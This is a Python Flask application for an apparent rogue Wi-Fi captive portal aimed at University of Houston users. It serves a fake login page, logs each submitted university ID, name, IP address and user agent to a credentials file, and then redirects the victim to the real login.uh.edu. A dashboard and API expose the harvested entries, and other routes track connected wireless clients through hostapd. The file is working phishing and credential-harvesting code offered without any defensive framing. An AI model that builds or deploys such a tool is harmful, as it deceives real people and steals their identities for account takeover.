from flask import Flask, request, redirect, render_template, jsonify, send_from_directory
from flask_cors import CORS
from datetime import datetime
import requests
import os
import ast
import subprocess
import re
import time

app = Flask(__name__, static_folder='static')  # Set the static folder explicitly
CORS(app)  # Enable CORS for development

# Global dictionary to track connected clients
connected_clients = {}

# Ensure creds directory exists
if not os.path.exists('creds'):
    os.makedirs('creds')
    with open('creds/credentials.txt', 'a') as f:
        pass  # Create empty file

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        data = {
            'timestamp': datetime.now().isoformat(),
            'uh_id': request.form.get('uid'),
            'first_name': request.form.get('fname'),
            'last_name': request.form.get('lname'),
            'ip': request.remote_addr,
            'ua': request.headers.get('User-Agent')
        }

        # Save to file
        try:
            with open("creds/credentials.txt", "a") as f:
                f.write(f"{data}\n")
        except Exception as e:
            print(f"Error writing to credentials file: {e}")

        return redirect("https://login.uh.edu")

    try:
        return render_template("login.html")
    except Exception as e:
        print(f"Error rendering login template: {e}")
        return str(e), 500

@app.route('/dashboard')
def dashboard():
    try:
        if os.path.exists('frontend/build'):
            return send_from_directory('frontend/build', 'index.html')
        return render_template("dashboard.html")
    except Exception as e:
        print(f"Error serving dashboard: {e}")
        return str(e), 500

@app.route('/api/creds')
def creds_api():
    entries = []
    creds_file = "creds/credentials.txt"
    if os.path.exists(creds_file):
        try:
            with open(creds_file, "r") as f:
                for line in f:
                    try:
                        entry = ast.literal_eval(line.strip())
                        entries.append(entry)
                    except Exception as e:
                        print(f"Error parsing line: {e}")
                        continue
        except Exception as e:
            print(f"Error reading credentials file: {e}")
    return jsonify(entries)

@app.route('/api/connections')
def connections_api():
    try:
        print("[DEBUG] Starting connections_api()")
        result = []
        current_time = int(time.time())
        
        # Get current connected stations from hostapd
        try:
            # First, get list of all stations
            output = subprocess.check_output(['sudo', 'hostapd_cli', '-i', 'wlan0', 'all_sta'], stderr=subprocess.PIPE)
            station_list = output.decode().strip().split('\n')
            print(f"[DEBUG] Raw station list: {station_list}")
            
            # Process each station
            for line in station_list:
                if re.match('^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', line):
                    mac = line.strip()
                    print(f"[DEBUG] Processing station MAC: {mac}")
                    
                    # Get detailed station info
                    station_info = subprocess.check_output(['sudo', 'hostapd_cli', '-i', 'wlan0', 'sta', mac], stderr=subprocess.PIPE).decode()
                    
                    # Initialize default values
                    client_info = {
                        'mac': mac,
                        'ip': 'Unknown',
                        'hostname': 'Unknown',
                        'connected_since': current_time,
                        'rx_mb': 0,
                        'tx_mb': 0,
                        'status': 'Connected'
                    }
                    
                    # Parse station info
                    for info_line in station_info.split('\n'):
                        if 'rx_bytes=' in info_line:
                            rx_bytes = int(info_line.split('=')[1])
                            client_info['rx_mb'] = round(rx_bytes / (1024 * 1024), 2)
                        elif 'tx_bytes=' in info_line:
                            tx_bytes = int(info_line.split('=')[1])
                            client_info['tx_mb'] = round(tx_bytes / (1024 * 1024), 2)
                        elif 'connected_time=' in info_line:
                            connected_time = int(info_line.split('=')[1])
                            client_info['connected_since'] = current_time - connected_time
                    
                    # Try to get IP and hostname from dnsmasq leases
                    if os.path.exists('/var/lib/misc/dnsmasq.leases'):
                        with open('/var/lib/misc/dnsmasq.leases', 'r') as f:
                            for lease in f:
                                lease_parts = lease.strip().split()
                                if len(lease_parts) >= 4 and lease_parts[1].lower() == mac.lower():
                                    client_info['ip'] = lease_parts[2]
                                    client_info['hostname'] = lease_parts[3]
                                    break
                    
                    result.append(client_info)
                    print(f"[DEBUG] Added connected client: {client_info}")
            
            # If no stations found, check if we at least have DHCP leases
            if not result and os.path.exists('/var/lib/misc/dnsmasq.leases'):
                with open('/var/lib/misc/dnsmasq.leases', 'r') as f:
                    for lease in f:
                        lease_parts = lease.strip().split()
                        if len(lease_parts) >= 4:
                            try:
                                lease_time = int(lease_parts[0])
                                # Only show recent leases (last 24 hours)
                                if current_time - lease_time <= 86400:
                                    result.append({
                                        'mac': lease_parts[1],
                                        'ip': lease_parts[2],
                                        'hostname': lease_parts[3],
                                        'connected_since': lease_time,
                                        'rx_mb': 0,
                                        'tx_mb': 0,
                                        'status': 'Disconnected'
                                    })
                            except (ValueError, IndexError):
                                continue
        
        except subprocess.CalledProcessError as e:
            print(f"[DEBUG] Error executing hostapd_cli: {e}")
            print(f"[DEBUG] Error output: {e.stderr.decode() if e.stderr else 'None'}")
            # Don't return immediately, still try to get DHCP leases
        
        print(f"[DEBUG] Returning {len(result)} clients")
        return jsonify(result)
    
    except Exception as e:
        print(f"[DEBUG] Unexpected error in connections_api: {str(e)}")
        import traceback
        print(f"[DEBUG] Traceback: {traceback.format_exc()}")
        return jsonify([])

# Event handlers for hostapd events
def handle_client_connect(mac):
    connected_clients[mac] = {
        'connected': True,
        'connect_time': time.time(),
        'duration': 'Just connected',
        'rx_mb': 0,
        'tx_mb': 0
    }
    print(f"[DEBUG] Updated client state for {mac}: {connected_clients[mac]}")

def handle_client_disconnect(mac):
    if mac in connected_clients:
        connected_clients[mac]['connected'] = False
        print(f"[DEBUG] Marked client {mac} as disconnected")

def update_client_durations():
    current_time = time.time()
    for mac, client in connected_clients.items():
        if client['connected']:
            duration = int(current_time - client['connect_time'])
            hours = duration // 3600
            minutes = (duration % 3600) // 60
            client['duration'] = f"{hours}h {minutes}m"

# Update durations periodically
@app.before_request
def before_request():
    update_client_durations()

# Event handler route for hostapd events
@app.route('/api/events', methods=['POST'])
def handle_event():
    try:
        event = request.json
        print(f"[DEBUG] Received event: {event}")
        
        if event['type'] == 'connect':
            handle_client_connect(event['mac'])
            print(f"[DEBUG] Client connected: {event['mac']}")
            
            # Get station info
            try:
                output = subprocess.check_output(['sudo', 'hostapd_cli', '-i', 'wlan0', 'sta', event['mac']], stderr=subprocess.PIPE)
                print(f"[DEBUG] Station info: {output.decode()}")
            except subprocess.CalledProcessError as e:
                print(f"[DEBUG] Error getting station info: {e}")
                
        elif event['type'] == 'disconnect':
            handle_client_disconnect(event['mac'])
            print(f"[DEBUG] Client disconnected: {event['mac']}")
            
        return jsonify({'status': 'ok'})
    except Exception as e:
        print(f"[DEBUG] Error in handle_event: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Serve React static files
@app.route('/dashboard/static/js/<path:filename>')
@app.route('/dashboard/static/css/<path:filename>')
@app.route('/dashboard/static/media/<path:filename>')
def serve_react_static(filename):
    if filename.startswith('main.'):
        folder = 'js' if '/js/' in request.path else 'css'
        return send_from_directory(f'frontend/build/static/{folder}', filename)
    return send_from_directory('frontend/build/static/media', filename)

# Serve captive portal static files
@app.route('/static/<path:filename>')
def serve_portal_static(filename):
    return send_from_directory('static', filename)

# Serve other React assets
@app.route('/dashboard/manifest.json')
def serve_manifest():
    return send_from_directory('frontend/build', 'manifest.json')

@app.route('/dashboard/favicon.ico')
def serve_favicon():
    return send_from_directory('frontend/build', 'favicon.ico')

@app.route('/dashboard/logo192.png')
def serve_logo():
    return send_from_directory('frontend/build', 'logo192.png')

if __name__ == '__main__':
    print(f"Starting Flask server on port 443...")
    print(f"Templates directory: {os.path.abspath('templates')}")
    print(f"Static directory: {os.path.abspath('static')}")
    print(f"React build directory: {os.path.abspath('frontend/build')}")
    app.run(host='0.0.0.0', port=443, ssl_context=('cert.crt', 'cert.key'), debug=True)
